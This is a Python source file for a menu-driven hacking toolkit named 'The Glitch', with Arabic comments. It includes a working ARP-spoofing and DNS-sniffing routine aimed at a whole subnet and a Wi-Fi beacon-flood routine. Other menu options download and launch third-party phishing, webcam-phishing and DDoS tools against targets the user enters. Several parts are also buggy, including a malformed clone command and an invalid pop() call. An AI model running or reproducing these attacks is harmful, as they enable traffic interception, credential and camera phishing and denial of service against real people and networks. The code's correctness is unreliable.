import subprocess
import socket
import time
import os
import sys
import requests
import csv  # UNUSED!!!
from bs4 import BeautifulSoup
import webbrowser

# ---------
import logging
from scapy.all import ARP, send, sniff
from scapy.layers.inet import IP
from scapy.layers.dns import DNS, DNSQR
import threading
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
# ---------


def ph_num():
    print(' after open page of facebook please enter a phone number then the profile while show !!!')
    print('enter [ctrl + c] to Quit ')
    webbrowser.open('https://www.facebook.com/login/identify/?ci=Ac-rE3l407p3fl5AZcr9Sx2csmDXTtecT6oqomN1N-5Xk53jNhHasM55U\
-onDfDHHsQtNLChQAei5lvk5B7r-vjMflnSV8WHahB5VpP5cp6cAHp5B1S8dVBuItrkyLNM0f7aZM92vGVUINNa6iYB7MtAroSJmBhXjFdMrlk8jLQ6r1VWl9W\
KwjY2aLkxFmBrd99VQIC86x70sGuUffU7MwW2eQ26-KyBdqnuTpALP0fpQMePBSjNi85C_iNGwjEkQMdb0AEEgy5LeP7i_ls0vHuAkXnW')


def os_tool():
    line_x = '----------------------------'
    print('\033[91m')
    print(' after open page of facebook please enter a phone number then the profile while show !!!')
    print('لو ظهر  اى حساب بعد ملدخل رقم التليفون يقبى الحساب مربوط بى الرقم دا ')
    print('mode = {osint} ')
    print(line_x)
    messagee = """
    1- by phone number
    2- Quit



    """
    print(line_x)
    while True:
        print(messagee)
        qu = input('enter your choice : ')
        if qu == '1':
            ph_num()
        elif qu == '2':
            break
        else:
            print('please enter a number from 1 to 2 !!!')


def use_tool():
    print('\033[92m')
    print('mode = [password created]')
    gkg = '#############'
    for hj in gkg:
        print(hj)
    print('enter [ctrl + c] to quit ')
    # ----------down----------------
    kskss = os.system(
        'git clone https://github.com/Mebus/cupp.git > /dev/null 2>&1')
    if kskss == 0:
        print('ok download true')
    else:
        print('there was some thing wrong or the tool was excist !!!')
    # ------------------------------
    # --------enter-----------
    os.chdir('cupp')
    # -----------------------
    # ----------------------start
    print('powered by [the Glitch]')
    print('the text is in folder cupp')
    pyth = [os.system('python3 cupp.py -i')]
    print(pyth.pop(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15))
    # ----------------------


def info_gen():
    while True:
        print('\033[92m')
        lf = "---------------"
        for kh in lf:
            print(kh)
        mess = """
        -----------------------------
        1- what this tool use
        2- use tool
        3- exit
        -----------------------------
        """
        print(mess)
        enter_cpp = input('enter your choice : ')
        if enter_cpp == '1':
            inform = """
           العربى 
           دى اداه عباره انك بتخل معلومات عن الشخص و بتلعلق قايمه باسوردات مسنوحاه من المعلومات الى دخلتها
           english
           This tool generates a personalized password list based on a target's personal information. By inputting details like names, birthdays, nicknames,
           """
            print(inform)
        elif enter_cpp == "2":
            use_tool()
        elif enter_cpp == "3":
            break
        else:
            print('please enter anumber from 1 to 3 !!!')
# ---------
# ---------


def ip_con():
    # ---------
    print('please to work successfully is tool  go to root')

    def arp_spoof(target_ip, spoof_ip):
        packet = ARP(op=2, pdst=target_ip,
                     hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip)
        send(packet, verbose=False)

    def dns_packet(packet):
        if packet.haslayer(DNS) and packet[DNS].qr == 0:

            ip_src = packet[IP].src
            dns_query = packet[DNSQR].qname.decode()
            print(ip_src, dns_query)

    def start_arp(target_ip, gateway_ip):
        while True:
            arp_spoof(target_ip, gateway_ip)
            arp_spoof(gateway_ip, target_ip)

    target_ip = "192.168.1.0/24"
    gateway_ip = "192.168.1.1"

    threading.Thread(target=start_arp, args=(
        target_ip, gateway_ip), daemon=True).start()
    print("HACKING NATEWORK")
    print('to stop enter [ctrl + c]')
    print("__________________________________")
    print(f"{'IP Address':<20}\t{'DNS Query':<40}")

    print("__________________________________")
    sniff(filter="udp port 53", prn=dns_packet, store=0)
    # ---------


def com_let():
    print('---------------------')
    print('to stop enter [ctrl + c]')
    enter_word = input('enter the name of fake wifi : ')
    with open("fake_wifi.txt", "w") as file:
        file.write(enter_word)

    enter_path = input('enter the path of file fake_wifi.txt : ')
    if enter_path:
        os.system('airmon-ng')
        enter_wl = input('what is your interface after monitor mode : ')
        os.system(f'mdk3 {enter_wl} b -c 2 -f {enter_path} ')
        print('atack true')
    print('---------------------')


def hack_wifiy():
    print("\033[1m" + "\033[92m")
    print('mode = [fake wifi]')
    print("\033[1m" + "\033[92m")
    enter_ch = input(
        'are you in root {if you are not in root please enter [ctrl + c ] and try again in root } : ')
    if enter_ch.lower() == 'y':
        # الدخول الى الداء
        os.system('mdk3')

        # معرفه نوع الانترفاس
        os.system('ifconfig')
        # قتل
        os.system('airmon-ng check kill ')

        # تشغيل
        enter_w = input('what is your interface [ech0  , wlan[0to5] ] : ')
        if enter_w:
            os.system(f'airmon-ng start {enter_w}')
            com_let()
        else:
            print('please enter your interface like wlan or ecth0')

    elif enter_ch.lower() == 'n':
        print('please try again in root enter [ctrl + c] to quit')
    else:
        print('enter just y or n ')


def hack_wifi():
    while True:
        print("\033[1m" + "\033[92m")
        print('wating %')
        time.sleep(1)
        print("\033[1m" + "\033[92m")
        print('\033[91m')
        fg = '^'
        for gg in fg:
            print(gg)
        print('--------------------------')
        gh = input('are your operating system is kail [y , n]: ')
        print('--------------------------')
        if gh.lower() == "y":
            hack_wifiy()
        elif gh.lower() == "n":
            print('good bye ')
            break
        else:
            print('please enter just y or n')
        print('\033[91m')


def ddos_ata():
    print('\033[91m')
    print('mode = {ddos atack}')
    print('to Quit enter [ctrl + c ]')
    print('\033[91m')
    if not os.path.exists("DDoS-Ripper"):
        os.system('https://github.com/palahsu/DDoS-Ripper.git')
    os.chdir("DDoS-Ripper")
    print('--------------------------------------')
    info = input('inter the link of the website : ')
    info_i = input('inter the port of the website : ')
    print('--------------------------------------')
    get_ip = socket.gethostbyname(info)
    print('waiting %')
    time.sleep(2)
    os.system(f'python3 DRipper.py -s {get_ip} -t {info_i}')
    if len(info) < 5:
        print('there was some thing wronge in the website')

    elif len(info_i) < 3:
        print('there some thing wronge in the port of website ')


def web_spa(url):
    src = url.content
    soup = BeautifulSoup(src, 'lxml')
    print(soup)


def web_spar():
    print('\033[91m')
    print('----------------------')
    print('mode = web_spark')
    print('*^&(%$$#^&#^^#%#(&%&^%')

    url = input('enter the link of your website : ')
    print('----------------------')

    res = requests.get(url)
    web_spa(res)

    print('\033[91m')


def info_mation():
    print('\033[91m')
    print("mode = {information of your computer}")
    print("\033[91m")
    print("\033[92m")
    while True:
        print('----------------------------')
        print('to know the username please dont go to the root in (linux)')
        past = input('do you want to start[y , n] : ')
        print('----------------------------')
        if past.lower() == "y":
            type = sys.platform
            print(f'type of your operating system is {type}')
            print('your user name of your computer is')
            user = os.system('whoami')
            py_on = sys.version
            print(f"your python version is {py_on} ")
        elif past.lower() == "n":
            print('good bye')
            break
        else:
            print('please enter just y or n')

        print('----------------------------')
        print("\033[92m")


def zp_hi():
    print("\033[1m" + "\033[92m")
    print("          mode = [hacker {pnishing}]")
    print("\033[0m")
    print("\033[94m")
    os.system('git clone https://github.com/htr-tech/zphisher.git > /dev/null 2>&1')
    os.chdir('zphisher')
    os.system('bash zphisher.sh')


def hack_cam():
    print("\033[1m" + "\033[92m")
    print("          mode = [hacker {cam_hacker}]")
    print("\033[0m")
    os.system(
        'git clone https://github.com/nethaxstark/CamPhish-Mark1.git > /dev/null 2>&1')
    os.chdir('CamPhish')
    os.system('bash camphish.sh')


# more detailed name for the function
def hacking_tools_mode():

    print('^' * 12)
    # Using multi-line instead of escape codes
    logo = r"""
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    "9b.     ./      dX:-=----------------=-:Xb      \.     . dP"     ,Xb
4b.     'qXb.   'u.    dP    _       _       _    9b    .u'   .dXp'     ,dY
 4b.     'qXb.   'u.  dP    /\     /\     /\    9b  .u'   .dXp'     ,dY
  "b.     'qXb.   'u dP    / /     \ \     \ \    9b u'   .dXp'     ,d"
   "b.     'qXb.    "dP    /_/       \_\       \_\   9b"    .dXp'     ,d"
    "b.     'qXb.    dX                             Xb    .dXp'     ,d"
     "b.     'qXb.  dX                               Xb  .dXp'     ,d"
      "b.     'qXb dP                                 9b .dXp'     ,d"
       "b.     'qXdP                                   9b dXp'     ,d"
        "b.     'qXb                                     dXp'     ,d"
         "b.     'qXb                                   dXp'     ,d"
          "b.     'qXb                                 dXp'     ,d"
           "b.     'qXb                               dXp'     ,d"
            "b.     'qXb                             dXp'     ,d"
             "b.     'qXb                           dXp'     ,d"
              "b.     'qXb                         dXp'     ,d"
               "b.     'qXb                       dXp'     ,d"
                "b.     'qXb                     dXp'     ,d"
                 "b.     'qXb                   dXp'     ,d"
                  "b.     'qXb                 dXp'     ,d"
                   "b.     'qXb               dXp'     ,d"
                    "b.     'qXb             dXp'     ,d"
                     "b.     'qXb           dXp'     ,d"
                      "b.     'qXb         dXp'     ,d"
                       "b.     'qXb       dXp'     ,d"
                        "b.     'qXb     dXp'     ,d"
                         "b.     'qXb   dXp'     ,d"
                          "b.     'qXb dXp'     ,d"
                           "b.     'qXdXp'     ,d"
                            "b.     'qXp'     ,d"
                             "b.     'q'     ,d"
                              "b.           ,d"
                               "b.         ,d"
                                "b.       ,d"
                                 "b.     ,d"
                                  "b.   ,d"
                                   "b. ,d"
                                    "b,d"
                                     "p"
    """
    print(logo)
    green_bold = "\033[1;92m"
    reset = "\033[0m"

    print(f"{green_bold}          mode = [hacker]{reset}\n")
    print("\033[0m")

    messege = """
    ----------------------------
    [1] Phishing tool
    [2] Hacking camera
    [3] DDoS atack
    [4] Make fake Wi-Fi
    [5] Control a device over network
    [6] Social Engineering Pass-Gen
    [7] OSINT tool
    [8] Exit\n\n\n\n
    \033[94m
    ------------------------------
    ------------------------------
    This tool is exculsive to Kali
    Press [ctrl + c] to quit
    ------------------------------
    More tools will be added in the next version of The Glitch
    ------------------------------
    ----------------------------
    0--0--0--0--0--0--0--0--0--0--0--0--0"""

    while True:
        print(messege)
        # Proper name for the variable
        hacking_tools_mode_choice = input(
            '    Enter your choice from 1 to 8 : ')
        print('    0--0--0--0--0--0--0--0--0--0--0--0--0')

        # Cleaner way than if-else
        match hacking_tools_mode_choice:
            case "1":
                zp_hi()
            case "2":
                hack_cam()
            case "3":
                ddos_ata()
            case "4":
                hack_wifi()
            case "5":
                ip_con()
            case "6":
                info_gen()
            case "7":
                os_tool()
            case "8":
                break
            case "_":
                print('Invalid choice choose from [ 1 - 8 ]')
        print('-----------------------------------')


def siem_net():
    print('\033[92m')
    print("mode = {find_all_ip_of_your_network}")
    print('\033[92m')

    try:
        gesf = 'karas'
        if gesf == "karas":
            print('/\/\/\/\ Start Scanning Network /\/\/\/\ ')

        # تشغيل الأمر وأخذ النتيجة
        output = subprocess.check_output(
            'nmap -sn 192.168.1.0/24', shell=True, text=True)

        # 1. نقطع النص لأسطر
        lines = output.splitlines()

        # 2. نفلتر الأسطر
        filtered_lines = []
        for line in lines:
            # شروطنا:
            # - السطر ميكونش فيه كلمة Nmap (بأي شكل Capital أو Small)
            # - السطر ميكونش فاضي
            if "nmap" not in line.lower() and line.strip() != "":
                filtered_lines.append(line)

        # 3. نطبع النتيجة النهائية منظفة
        print("\n".join(filtered_lines))

    except Exception as e:
        print(f"Error: {e}")


def all_port():
    print('\033[92m')
    print('mode = {find_all_open_port}')
    print('\033[92m')

    try:
        print('----------------------')
        bts = input("enter the ip : ")
        print('^^^^^^the resault^^^^^^^')

        cdf = "$$$$$$$$$$"
        for i in cdf:
            print(i)

        output = subprocess.check_output(
            f'nmap -sS -sV -Pn {bts}', shell=True).decode()

        lines = output.splitlines()
        for line in lines:
            if "Host is up" in line or "/tcp" in line or "PORT" in line or "Not shown" in line:
                print(line)

        print('----------------------')
    except Exception:
        print(f'please check your ip is {bts}')


def in_fo():
    print('\033[92m')
    print('mode = {information of website}')
    print('\033[92m')

    try:
        gsf = 'hh'
        if gsf == "hh":
            gssf = input('Enter the website (e.g., google.com): ')
            print(f"--- [The Glitch] is starting the scan on {gssf} ---")

            # تشغيل نيكتو بدون تحديد ssl عشان يبقى مرن
            process = subprocess.Popen(
                f'nikto -h {gssf}',
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            # قراءة المخرجات سطر بسطر "لايف"
            for line in process.stdout:
                # الحركة الصايعة: شيل Nikto وحط The Glitch
                # بنستخدم .replace() عشان نغير الكلمة في السطر كله
                clean_line = line.replace(
                    "Nikto", "The Glitch").replace("nikto", "The Glitch")

                # طباعة السطر بعد التعديل
                print(clean_line.strip())
    except Exception as e:
        print('there was some problem')


def scan_net():
    print('\033[92m')
    print('mode = {find_myip}')
    print('\033[92m')
    print("--- [ Extracting IP from ifconfig ] ---")
    try:
        # 1. تشغيل الأمر وحفظ النتيجة في متغير
        # بنستخدم 'wlan0' للواي فاي أو 'eth0' للسلك (ممكن نغيرها حسب جهازك)
        result = subprocess.run(['ifconfig', 'wlan0'],
                                capture_output=True, text=True)

        if result.returncode == 0:
            output = result.stdout

            # 2. عملية "القص" السحرية بالـ split
            # بندور على كلمة 'inet ' ونقسم الكلام عندها
            if 'inet ' in output:
                # بنقسم عند 'inet ' وبعدين ناخد الحتة اللي بعدها ونقسمها بالمسافة
                # وناخد أول كلمة تطلع (اللي هي الـ IP)
                temp = output.split('inet ')[1]
                my_ip = temp.split(' ')[0]

                print(f"[+] Your IP Address is: {my_ip}")
                return my_ip
            else:
                print("[!] Could not find 'inet' in ifconfig output.")
        else:
            print("[!] ifconfig failed. Make sure you are on Linux/Kali.")

    except Exception as e:
        print(f"[!] Error: {e}")


# تجربة الدالة
scan_net


def find_dns():
    print('\033[92m')
    print('mode = {find_dns}')
    print('\033[92m')
    print('------------------------------------------------------')
    domain_name = input('enetr your domain forexample(google.com) :')
    print('------------------------------------------------------')
    try:
        ip_dns = socket.gethostbyname_ex(domain_name)
        print("- - - - - - - rseault - - - - - - - -")
        xssa = "***********"
        for i in xssa:
            print(i)
        time.sleep(1)
        print('-------------------------------')
        print(f"your website is {domain_name}")
        print('-------------------------------')
        print(f'the dns of {domain_name} is : {ip_dns}')
        print('end [have a nice time (^_^)] ......')

    except socket.gaierror:

        print('wrong enput please check the link !!!')


print('-------------------------------------')
print(' The Glitch v 1.0 [beta]')
print('[POWERED BY KARAS]')
print('scanning is work at kail only ')
print('95 % tools is work just in kail')
print('-------------------------------------')
time.sleep(1)
face = """
\033[93m
             ,        ,
            /(        )\\
           \  \      /  /
            \  \    /  /
             \  \  /  /
            __\  \/  /__
           |            |
          /    O    O    \\
         |      ____      |
          \    \____/    /
           \            /
            \__________/
             /        \\

    """

print(face)
word = "\033[93m  TOO DANGERUS !!!"
print(word)
time.sleep(1)
xss = '##########'
for i in xss:
    print(i)
message = """-------------------------------------------
[warning  waiting from another version to get more tool and less bugs !!!]
[this tool is use some librarys and another dowunload it frist to work succussfully (^_^)]
1- who is devolper
2- find dns
3- Quit
4- find my ip network
5- find all ports open in [ip ]
6- find all in formation of websits[not all apen ports !!!]
7- scan the network 
8- hacking tools
9- know some information of your computer
10 - Web Scraping
--------------------------------------------------------"""
while True:
    print(message)

    print('%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%')
    enter = input('enter your choice from 1 to 10[3 for quit] : ')
    css = "-------------------------------------"
    if enter == "1":
        print(css)
        print('devolper is [karas]  phone number is [***********8****]')
    elif enter == "2":
        find_dns()
    elif enter == "4":
        scan_net()
    elif enter == "5":
        all_port()
    elif enter == "6":
        in_fo()
    elif enter == "7":
        siem_net()
    elif enter == "8":
        print('wating %')
        time.sleep(2)
        hacking_tools_mode()
    elif enter == "9":
        info_mation()
    elif enter == "10":
        web_spar()
    elif enter == "3":
        print('----------------')
        print('good bye')
        print('----------------')
        break
    else:
        print(f'word {enter} is not true please enter a number from 1 to 10 !!!')
